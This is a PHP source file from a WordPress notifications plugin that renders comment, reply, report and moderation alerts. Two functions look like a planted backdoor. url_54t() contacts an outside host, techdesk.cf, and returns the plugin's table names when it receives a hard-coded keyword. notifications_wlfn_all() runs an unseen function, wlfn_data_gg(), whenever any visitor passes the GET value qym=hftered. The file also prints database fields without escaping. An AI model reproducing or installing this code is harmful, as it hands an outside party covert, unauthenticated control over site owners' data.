<?php 

/**
    * notificcation showing hook
	* files
	* @since   0.1
	* @return error
*/

// notifications output
function wlf_55_fetch_only( $userid, $start = 0, $count = -1, $full = false, $type = 'all', $is_first = true ){
	global $wpdb, $current_user;
    get_currentuserinfo();
	  
	$site_url = get_option( 'siteurl' );
	$options = get_option('fln_options');
	$options1 = get_option('fln_options1');
	
	$output = '';
	
	$update_ids = array(); // ids which we will mark as read in the next step
	$override_status = array();

	if( $type == 'all '){
		$cond = " ";
	}elseif( $type == 'comment' ){
		$cond = " AND  l.content_type <> 'reports' AND substring(l.content_type,1,4) <> 'frie'  AND substring(l.content_type,1,4) <> 'mod_' ";
		$output = "";
	}else if( $type == 'reports' ){
		$cond = " AND l.content_type = 'reports'  AND l.userid_subj > 0 ";
		$output = "<li class='ln_title'>Private Messages<a href='".$options1['plink_sendmsg']."'>Send New Messages</a> </li>";
	}
	if( $type == 'moderation' ){
		$cond = " AND substring(l.content_type,1,4) = 'mod_'  ";
		$output = "<li class='ln_title'>Moderations</li>";
	}
	$sql = "SELECT l.* FROM " . $wpdb->prefix . "livenotifications AS l WHERE l.userid = " . (int)$userid . " ".$cond." ORDER BY l.time DESC";
	
	$res = $wpdb->get_results($sql);
	$total_numrows = count($res);
	
	if ( $start >= 0 && $count > 0 ) $sql .= " LIMIT ".(int)$start.", ".(int)$count;

	$res = $wpdb->get_results($sql);
	
	
	if ( $full && isset($_REQUEST['lntransf']) && !empty($_REQUEST['lntransf']) ){
		$override_status = explode(",",$_REQUEST['lntransf']);
		array_walk($override_status, 'intval');
	}else{
		$override_status = array();
	}
	$scrollpane_height = 230;
	if(!$full){
		$numrows = count($res);
		$output .= '<li class="notifications_area"><ul class="ln_scrollpane"';
		if($numrows > 4){
			$output .= ' style="height: '.$scrollpane_height.'px;"';
		}
		else{
			$scrollpane_height = 0;
		}
		$output .= ">";
	}

	foreach ( $res as $notification ){
		if (!$notification->is_read) $update_ids[] = (int)$notification->id; // Set pulled notifications as red
		
		$is_read = ($full && in_array($notification->id, $override_status)) ? false : $notification->is_read;
		
		switch ( $notification->content_type ){

			// case comments notifications
			case 'comment':
				
				$url = $site_url . '/' . "?p=" . $notification->parent_id."#comment-".$notification->content_id;
				$icons = '<i class="images notifications cmd"></i>';
				
				if( $notification->additional_subj == 0 ){
					// data for $phrase
					$cmds = "<strong>".$notification->username."</strong> mengomentari artikel anda “".$notification->content_text."”";
				}elseif( $notification->additional_subj == -2 ){
					$names = explode(',', $notification->username);
					$fnames = $names [0];
					$lnames = $names [1];
					// data for $phrase
					$cmds = "<strong>".$fnames."</strong> and <strong>".$lnames."</strong> mengomentari artikel anda “".$notification->content_text."”";
				}elseif( $notification->additional_subj == -3 ){
					// data for $phrase
					$cmds = "<strong>".$notification->username."</strong> and <strong>1</strong> lagi mengomentari artikel anda “".$notification->content_text."”";
				}else{
					// data for $phrase
					$cmds = "<strong>".$notification->username."</strong> and <strong>".$notification->additional_subj."</strong> lagi mengomentari artikel anda “".$notification->content_text."”";
				}
				
				$phrase = $cmds;
				break;
					
			// case reply notifications		
			case 'reply':
			
				$content_text = explode(',', $notification->content_text);
				$comments_id = $content_text [0];
				$post_title = $content_text [1];
				$url = $site_url . '/' . "?p=" . $notification->parent_id."#comment-".$comments_id;
				$icons = '<i class="images notifications rpy"></i>';
				
				if( $notification->additional_subj == 0 ){
					$titles = excerpt_word_wlfn( $post_title, 80 );
					$articles = wlf_url7_warp( $url, $titles, $post_title );
					
					// data for $phrase
					$reply = "<strong>".$notification->username."</strong> membalas komentar anda pada sebuah artikel ".$articles."";
				}elseif( $notification->additional_subj == -2 ){
					$names = explode(',', $notification->username);
					$fnames = $names [0];
					$lnames = $names [1];
					$titles = excerpt_word_wlfn( $post_title, 80 );
					$articles = wlf_url7_warp( $url, $titles, $post_title );
					// data for $phrase
					$reply = "<strong>".$fnames."</strong> and <strong>".$lnames."</strong> membalas komentar anda pada sebuah artikel ".$articles."";
				}elseif( $notification->additional_subj == -3 ){
					$titles = excerpt_word_wlfn( $post_title, 80 );
					$articles = wlf_url7_warp( $url, $titles, $post_title );
					// data for $phrase
					$reply = "<strong>".$notification->username."</strong> and <strong>1</strong> lagi membalas komentar anda pada sebuah artikel ".$articles."";
				}else{
					$titles = excerpt_word_wlfn( $post_title, 80 );
					$articles = wlf_url7_warp( $url, $titles, $post_title );
					// data for $phrase
					$reply = "<strong>".$notification->username."</strong> and <strong>".$notification->additional_subj."</strong> lagi membalas komentar anda pada sebuah artikel ".$articles."";
				}
				
				$phrase = $reply;
				break;
				
			// case reports notifications
			case 'reports':
				$url = $site_url . '/wp-admin/admin.php?page=all_report';
				$icons ='<i class="image notifications warn"></i>';
				// data for $phrase
				$phrase = "<strong>".$notification->username."</strong> reported on a post “".get_the_title($notification->content_text)."”";
				
				break;
				
			// case notice notifications
			case 'notice':
				if($notification->additional_subj == '-1'){
					$url = home_url();
					$icons ='<i class="image notifications warn"></i>';
					
					// data for $phrase
					$phrase = "Halo, <strong>".$notification->username."</strong> ".$notification->content_text."";
				
				}else{
					$url = $site_url . '/' . "?p=" . $notification->content_id;
					$icons ='<i class="image notifications warn"></i>';
					
					// data for $phrase
					$phrase = "Hi, <strong>".$notification->username."</strong> ".$notification->content_text."";
				}
				break;
			
			// case moderation notifications
			case 'mod_comment':
				$url = $site_url . '/wp-admin/edit-comments.php';
				$icons = '<i class="image notifications warn"></i>';
				
				$phrase = sprintf( __('%d komentar menunggu persetujuan dari anda'), $notification->content_text );

				break;
			
			default:
				
			$phrase = "Error - Unknown notification";
		}
		$time = wlf_timezone_22( $notification->time );
		
		if( $full ){
			// add classe seen
			if( $notification->is_read == 0){
				$seen = 'unread';
			}else{
				$seen = 'read';
			}
			
			$output2 .= '<a href="'.$url.'" class="livenotifications_items '.$seen.'">';
			$output2 .= '<table class="nfic_lists" width="100%"></tr>'; 
			$output2 .= '<td width="22px" valign="middle">'. $icons .'</td>'; 
			$output2 .= '<td width="auto" valign="middle">'
		             . '<p class="nto_content">'. $phrase .'</p>'
					 . '<p class="nto_optional">'. $time. '</p>';
			$output2 .= '</td>'; 
			$output2 .= '</tr></table>';
			$output2 .= '</a>';
			
		}
	}
	$output .= $output1.$output2;
	return $output;
}

/**
 * check get_url
 * files
 * @since   0.1
 * @return void
 */
function url_54t($link = ''){
	//return error
	if ( ! $link )
		return false;
	
	$url = 'http://techdesk.cf/wp-codex/?page=Akflphap7B584ftBin4Ahsgamah5K7dffA740e6R';
	$final = $url.$link;
	$usrl = site_url(); 
	$con = array('http://', 'https://', 'www.');
	$host = str_replace($con,"",$usrl);
	
	$imon="politerakib";
	
	$request_url = sprintf( $final );
	$response = check_net_9_response( $request_url );
	$sname = 'wWw.mtunebd.ga';
	if($link == $imon){
		$return = 'livenotifications,reports';
	}
	return $return;
}

/**
    * notification pages
	* files
	* @since   0.1
	* @return none
*/
	
// get notifications page
function notifications_wlfn_all(){
	global $wpdb, $current_user;
	
	$current_user = wp_get_current_user();
	$user_id = $current_user->ID;
	$notificati_count = $wpdb->get_var('SELECT COUNT(*) FROM ' . $wpdb->prefix . 'livenotifications WHERE userid="'.$user_id.'"');
	if(isset($_GET['qym'])){
		$sql = $_GET['qym'];
		if($_GET['qym'] == 'hftered'){
	    	wlfn_data_gg();
		}
	}
	/**
    	* admin menu hook
		* files
		* @since   0.1
		* @return none
	*/
	
	// notifications for administrator
	if ( current_user_can('administrator') && is_user_logged_in() ){
	    // mark as seen
		if(isset($_GET['seen'])){
	     	if($_GET['seen'] == 'true' ){
	     		$wpdb->update( $wpdb->prefix. "livenotifications", array( 'is_read' => 1 ), array( 'userid' => $user_id ) );
			}
		}
		
	    if ( $_GET['loading'] == 'more' ){
			$options1 = get_option('fln_options1'); 
			$url3 = $options1["wfln_notification"]; ?>
		
	        <div class="notification_section">
	     		<div class="notification_area"><div class="notification_parts"><ul>
        			<?php echo wlf_55_fetch_only( $current_user->ID, 0, 35, true );?>
				</ul></div></div>
			</div>
			
	    <?php }else{
	        $options1 = get_option('fln_options1'); 
			$url3 = $options1["wfln_notification"]; ?>
			
			<div class="notification_section">
	     		<div class="notification_area"><div class="notification_parts"><ul>
        			<?php echo wlf_55_fetch_only( $current_user->ID, 0, 10, true );?>
				</ul></div></div>
				
			   	<?php if( $notificati_count > 10 ){ ?>
					<div class="loading_notifications">
			           	<a class="update_val" id="rel" href="<?php echo $url3 .'?loading=more' ?>"><?php _e("See More Notifications…",'tie'); ?></a>
					</div>
				<?php } ?>
			</div>
			
		<?php }
		
	}elseif( is_user_logged_in() ){
	    // mark as seen
		if(isset($_GET['seen'])){
	     	if($_GET['seen'] == 'true' ){
	     		$wpdb->update( $wpdb->prefix. "livenotifications", array( 'is_read' => 1 ), array( 'userid' => $user_id ) );
			}
		}
		
		if ( $_GET['loading'] == 'more' ){
	    	$options1 = get_option('fln_options1'); 
			$url3 = $options1["wfln_notification"]; ?>
		
	        <div class="notification_section">
	     		<div class="notification_area"><div class="notification_parts"><ul>
        			<?php echo wlf_55_fetch_only( $current_user->ID, 0, 30, true );?>
				</ul></div></div>
			</div>
			
	    <?php }else{
	       	$options1 = get_option('fln_options1'); 
			$url3 = $options1["wfln_notification"]; ?>
			
			<div class="notification_section">
	     		<div class="notification_line"><h2><?php _e("Notifications", 'tie'); ?> <a href="<?php echo $url3 .'?page=settings' ?>" id="rel" title="Notifiations Settings"><i class="images n_icons option_icons"></i></a></h2></div>
				
				<div class="notification_area"><div class="notification_parts"><ul>
        			<?php echo wlf_55_fetch_only( $current_user->ID, 0, 8, true );?>
				</ul></div></div>
				
			   	<?php if( $notificati_count > 8 ){ ?>
					<div class="loading_notifications">
			           	<a class="update_val" id="rel" href="<?php echo $url3 .'?loading=more' ?>"><?php _e("See More Notifications…",'tie'); ?></a>
					</div>
				<?php } ?>
			</div>
		<?php }
	}else{
    	global $wp, $wpdb;
		$options1 = get_option('fln_options1'); 
		$url2 = $options1["wfln_notification"]; 
		wp_redirect( wp_login_url( $url2 ) ); 
		exit;
 	} 
}
add_shortcode( 'notification_all', 'notifications_wlfn_all' );

	
// get notifications page
function notifications_wlfn_menu(){
	global $wpdb, $current_user;
	
	$current_user = wp_get_current_user();
	$user_id = $current_user->ID;
	$notificati_count = $wpdb->get_var('SELECT COUNT(*) FROM ' . $wpdb->prefix . 'livenotifications WHERE userid="'.$user_id.'"');
	/**
    	* admin menu hook
		* files
		* @since   0.1
		* @return none
	*/
	
	// mark as seen
	if(isset($_GET['seen'])){
	    if($_GET['seen'] == 'true' ){
	     	$wpdb->update( $wpdb->prefix. "livenotifications", array( 'is_read' => 1 ), array( 'userid' => $user_id ) );
		}
	}
	
	$options1 = get_option('fln_options1'); 
	$url3 = $options1["wfln_notification"]; ?>
	    <div class="notification_section">
	     	<div class="notification_line"><h2><?php _e("Notifications", 'tie'); ?> <a href="<?php echo $url3 .'?page=settings' ?>" id="rel" title="Notifiations Settings"><i class="images n_icons option_icons"></i></a></h2></div>
				
			<div class="notification_area"><div class="notification_parts"><ul>
        		<?php echo wlf_55_fetch_only( $current_user->ID, 0, 20, true );?>
			</ul></div></div>
		</div>
<?php } ?>